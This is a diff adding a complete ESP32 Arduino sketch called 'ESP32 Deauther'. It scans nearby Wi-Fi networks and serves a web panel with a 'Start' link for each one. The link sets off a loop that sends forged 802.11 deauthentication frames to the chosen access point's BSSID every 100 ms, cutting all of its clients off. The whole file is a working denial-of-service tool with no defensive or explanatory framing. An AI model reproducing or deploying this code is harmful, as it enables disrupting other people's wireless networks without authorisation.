@@ -1,0 +1,85 @@
+#include <WiFi.h>
+#include <esp_wifi.h>
+#include <WebServer.h>
+
+WebServer server(80);
+
+#define MAX_SSIDS 20
+String ssidList[MAX_SSIDS];
+uint8_t bssidList[MAX_SSIDS][6];
+int ssidCount = 0;
+bool attackEnabled = false;
+uint8_t targetBSSID[6];
+
+const char* ap_ssid = "ESP32_Deauther";
+const char* ap_pass = "deauth123";
+
+void sendDeauth(const uint8_t* bssid) {
+  uint8_t deauthPacket[26] = {
+    0xC0, 0x00, 0x3A, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+    0x00, 0x00,
+    0x07, 0x00
+  };
+  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+}
+
+void scanWiFi() {
+  ssidCount = WiFi.scanNetworks(false, true);
+  if (ssidCount > MAX_SSIDS) ssidCount = MAX_SSIDS;
+  for (int i = 0; i < ssidCount; i++) {
+    ssidList[i] = WiFi.SSID(i);
+    memcpy(bssidList[i], WiFi.BSSID(i), 6);
+  }
+}
+
+void handleRoot() {
+  String html = "<html><body><h2>ESP32 Deauther</h2><ul>";
+  for (int i = 0; i < ssidCount; i++) {
+    char bssidStr[18];
+    sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
+            bssidList[i][0], bssidList[i][1], bssidList[i][2],
+            bssidList[i][3], bssidList[i][4], bssidList[i][5]);
+    html += "<li>" + ssidList[i] + " [" + String(bssidStr) + "] - <a href='/attack?i=" + String(i) + "'>Start</a></li>";
+  }
+  html += "</ul><a href='/stop'>Stop Attack</a></body></html>";
+  server.send(200, "text/html", html);
+}
+
+void handleAttack() {
+  int i = server.arg("i").toInt();
+  if (i >= 0 && i < ssidCount) {
+    memcpy(targetBSSID, bssidList[i], 6);
+    attackEnabled = true;
+  }
+  server.sendHeader("Location", "/");
+  server.send(302, "text/plain", "");
+}
+
+void handleStop() {
+  attackEnabled = false;
+  server.sendHeader("Location", "/");
+  server.send(302, "text/plain", "");
+}
+
+void setup() {
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAP(ap_ssid, ap_pass);
+  delay(1000);
+  scanWiFi();
+
+  server.on("/", handleRoot);
+  server.on("/attack", handleAttack);
+  server.on("/stop", handleStop);
+  server.begin();
+}
+
+void loop() {
+  server.handleClient();
+  if (attackEnabled) {
+    sendDeauth(targetBSSID);
+    delay(100);
+  }
+}
